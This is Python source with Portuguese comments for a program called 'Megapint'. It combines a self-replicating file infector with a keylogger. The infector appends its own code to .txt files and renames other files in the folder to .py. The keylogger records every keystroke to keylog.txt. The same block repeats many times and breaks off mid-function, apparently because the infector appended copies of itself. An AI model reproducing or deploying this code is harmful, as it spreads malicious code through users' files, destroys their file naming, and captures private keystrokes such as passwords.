        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
